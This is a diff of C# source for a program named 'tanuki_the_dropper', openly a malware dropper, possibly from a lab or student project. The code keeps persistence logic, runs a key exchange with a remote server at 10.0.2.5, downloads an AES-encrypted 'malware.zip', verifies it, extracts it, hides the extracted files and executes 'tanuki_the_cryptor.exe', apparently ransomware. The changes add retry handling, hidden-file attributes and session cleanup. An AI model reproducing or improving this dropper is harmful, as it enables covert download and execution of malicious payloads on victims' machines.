@@ -1,5 +1,6 @@
 ﻿using Packets;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
 using System.Numerics;
@@ -11,21 +12,9 @@ namespace tanuki_the_dropper
 {
     class Program
     {
-        private static Mutex mutex = null;
+        
         static void Main(string[] args)
         {
-            const string appName = "tanuki";
-            bool createdNew;
-
-            mutex = new Mutex(true, appName, out createdNew);
-
-            if (!createdNew)
-            {
-                Console.WriteLine(appName + " is already running! Exiting the application.");
-                Console.ReadKey();
-                return;
-            }
-
             Console.WriteLine("tanuki!!!!!!!!");
 
             Persistence persistence = new Persistence();
@@ -43,12 +32,11 @@ namespace tanuki_the_dropper
         private BigInteger dh_key;
         private BigInteger aes_key;
         private Communication comm;
+        private int RetryTimes = 3;
+        private int WaitTime = 6000;
 
         public void Execute()
         {
-            var RetryTimes = 3;
-            var WaitTime = 6000;
-
             for (int i = 0; i < RetryTimes; i++)
             {
                 try
@@ -71,7 +59,7 @@ namespace tanuki_the_dropper
             BigInteger gx;
             try
             {
-                comm = new Communication("localhost", 65432);
+                comm = new Communication("10.0.2.5", 65432);
 
                 byte[] keyGenRequest_bytes = Packet.GenNewRequest("keyExchangeGen");
 
@@ -96,6 +84,13 @@ namespace tanuki_the_dropper
             catch (Exception ex)
             {
                 Console.WriteLine("Could not generate dropper's keys: " + ex.Message);
+
+                if(comm != null)
+                {
+                    byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
+                    comm.SendMessage(endRequest_bytes);
+                }
+
                 comm.Close();
                 throw;
             }
@@ -106,44 +101,60 @@ namespace tanuki_the_dropper
             try
             {
                 (byte[] exeZip_bytes, int bytesRead) = (null, 0);
-                for (int i = 0; i < 3; i++)
+                for (int i = 0; i < RetryTimes; i++)
                 {
-                    byte[] exeInfoRequest_bytes = Packet.GenNewRequest("exeSend");
-                    comm.SendMessage(exeInfoRequest_bytes);
-
-                    byte[] response_byte = comm.RecvMessage(4096);
-                    (string serverHash, int serverSize) = Packet.GetExeInfo(response_byte);
-
-                    (exeZip_bytes, bytesRead) = comm.RecvBinary(serverSize);
-
-                    if (bytesRead != serverSize)
+                    try
                     {
-                        Console.WriteLine("EXE size error: ");
-                        continue;
+                        byte[] exeInfoRequest_bytes = Packet.GenNewRequest("exeSend");
+                        comm.SendMessage(exeInfoRequest_bytes);
+
+                        byte[] response_byte = Cryptography.AESDecrypt(comm.RecvMessage(4096), aes_key.ToByteArray());
+                        Console.WriteLine("Message length: " + response_byte.Length);
+
+                        (string serverHash, int serverSize) = Packet.GetExeInfo(response_byte);
+
+                        (exeZip_bytes, bytesRead) = comm.RecvBinary(serverSize);
+
+                        if (bytesRead != serverSize)
+                        {
+                            Console.WriteLine("EXE size error: ");
+                            continue;
+                        }
+
+                        exeZip_bytes = Cryptography.AESDecrypt(exeZip_bytes, aes_key.ToByteArray());
+                        string clientHash = Cryptography.GetHash(exeZip_bytes);
+
+                        if (!clientHash.Equals(serverHash))
+                        {
+                            Console.WriteLine("EXE hash error: ");
+                            Console.WriteLine("Hash server: " + serverHash);
+                            Console.WriteLine("Client server: " + clientHash);
+                            continue;
+                        }
+
+                        break;
                     }
-
-                    exeZip_bytes = Cryptography.AESDecrypt(exeZip_bytes, aes_key.ToByteArray());
-                    string clientHash = Cryptography.GetHash(exeZip_bytes);
-
-                    if (!clientHash.Equals(serverHash))
-                    {
-                        Console.WriteLine("EXE hash error: ");
-                        Console.WriteLine("Hash server: " + serverHash);
-                        Console.WriteLine("Client server: " + clientHash);
-                        continue;
-                    }
-
-                    break;
+                    catch(Exception ex) { Console.WriteLine(ex.ToString()); if (i == 2) throw; }
                 }
 
                 Console.WriteLine("Writing zip.");
+                Console.WriteLine("Bytes recieved: " + bytesRead);
+                Console.WriteLine("Bytes zip: " + bytesRead);
                 using (FileStream file = new FileStream("malware.zip", FileMode.Create, FileAccess.Write))
                 {
-                    file.Write(exeZip_bytes, 0, bytesRead);
+                    file.Write(exeZip_bytes, 0, exeZip_bytes.Length);
+                    //File.SetAttributes("malware.zip", File.GetAttributes("malware.zip") | FileAttributes.Hidden);
                 }
 
                 Console.WriteLine("Extracting zip.");
-                ZipFile.ExtractToDirectory("malware.zip", ".\\");
+                ZipFile.ExtractToDirectory("malware.zip", ".\\malware");
+                foreach(string file in Directory.GetFiles(".\\malware"))
+                {
+                    File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
+                }
+
+                byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
+                comm.SendMessage(endRequest_bytes);
 
                 Exec.ExecProgram(".\\malware\\tanuki_the_cryptor.exe");
 
@@ -160,6 +171,11 @@ namespace tanuki_the_dropper
                         File.Delete(file);
                     Directory.Delete("malware");
                 }
+
+                byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
+                comm.SendMessage(endRequest_bytes);
+
+                comm.Close();
                 throw;
             }
 
